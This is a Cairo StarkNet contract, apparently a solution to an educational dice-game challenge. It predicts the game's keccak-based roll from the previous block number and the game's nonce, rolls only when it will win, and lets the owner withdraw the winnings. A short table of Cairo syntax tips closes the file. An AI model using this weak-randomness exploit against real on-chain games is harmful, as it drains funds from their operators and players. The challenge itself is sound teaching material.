use dice_game_stark::DiceGame::{IDiceGameDispatcher, IDiceGameDispatcherTrait};
use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};

#[starknet::interface]
pub trait IRiggedRoll<T>{
    fn rig_roll_dice(ref self:T, amount:u256) ->bool;
    fn get_prize(ref self:T)-> bool;
    fn get_winning_block( self:@T) -> u64;
    fn dice_game_dispatcher(self:@T) -> IDiceGameDispatcher;
    fn token_dispatcher(self:@T) -> IERC20Dispatcher;
}

#[starknet::contract]
pub mod RiggedRoll{
    use core::keccak::keccak_u256s_le_inputs;
    use starknet::storage::{StoragePointerReadAccess, StoragePointerWriteAccess};
    use starknet::{ContractAddress, get_block_number, get_caller_address, get_contract_address};
    use super::*;  
   #[storage]
    struct Storage {
        winning_block:u64,
        diceGameDispatcher:IDiceGameDispatcher,
        tokenDispatcher:IERC20Dispatcher,
        contract_owner:ContractAddress,
    }
    #[event]
    #[derive(Drop, starknet::Event)]
    pub enum Event {
        RigRolled: RigRolled,
    }
    #[derive(Drop, starknet::Event)]
    pub struct RigRolled {
        pub amount: u256,
        pub roll: u64,
    }
    #[constructor]
    fn constructor(ref self: ContractState, 
                    dice_game_address: ContractAddress,
                    token_address: ContractAddress,
                    contract_owner: ContractAddress) {
        self.diceGameDispatcher.write(IDiceGameDispatcher { contract_address: dice_game_address });
        self.tokenDispatcher.write(IERC20Dispatcher { contract_address: token_address });
        self.contract_owner.write(contract_owner);
        self.winning_block.write(0_u64);
    }
    #[abi(embed_v0)]
    impl RiggedRollImpl of super::IRiggedRoll<ContractState>{
        fn rig_roll_dice(ref self:ContractState,amount:u256)->bool{
        if !self._check_if_winnable(){false}else{
        let dicegame_address:ContractAddress = self.diceGameDispatcher.read().contract_address;
        let _=self.tokenDispatcher.read().approve(dicegame_address, amount);
        self.diceGameDispatcher.read().roll_dice(amount);
        let block_number = get_block_number();
        self.winning_block.write(block_number);
        self.emit(RigRolled { amount:amount, roll:block_number });
        true
        }
        }
        fn dice_game_dispatcher(self:@ContractState) -> IDiceGameDispatcher {
            self.diceGameDispatcher.read()
        }
        fn get_winning_block( self:@ContractState) -> u64 {
            self.winning_block.read()
        }
        fn token_dispatcher(self:@ContractState) -> IERC20Dispatcher {
            self.tokenDispatcher.read()
        }
        fn get_prize(ref self:ContractState) -> bool{
            let caller:ContractAddress = get_caller_address();
            assert!(get_caller_address() == self.contract_owner.read(),"You are not the owner!");
            let prize_munny = self.tokenDispatcher.read().balance_of(get_contract_address());
            let success =self.tokenDispatcher.read().transfer(caller, prize_munny);
            success 
        } 
    }
      #[generate_trait]
    pub impl InternalImpl of InternalTrait {
       fn _check_if_winnable(self:@ContractState) -> bool {
            let prev_block: u256 = get_block_number().into() - 1;
            let dicegame_nonce:u256 = self.diceGameDispatcher.read().nonce();
            let array = array![prev_block, dicegame_nonce];
            let roll = keccak_u256s_le_inputs(array.span()) % 16;
            roll < 5    
        }
    }
}

// | Part                 | Purpose                             | Memory Trick                    |
// | -------------------- | ----------------------------------- | ------------------------------- |
// | `#[contract] mod`    | Entry point for your contract       | "Cairo contract = module"       |
// | `#[interface] trait` | Declare the public API              | "Interface = trait = blueprint" |
// | `impl of trait`      | Define the actual logic             | "Impl connects contract + API"  |
// | `ref self`           | Used when you **write** to storage  | "ref = mutable = writing"       |
// | `self`               | Used when you **read** from storage | "just self = read only"         |
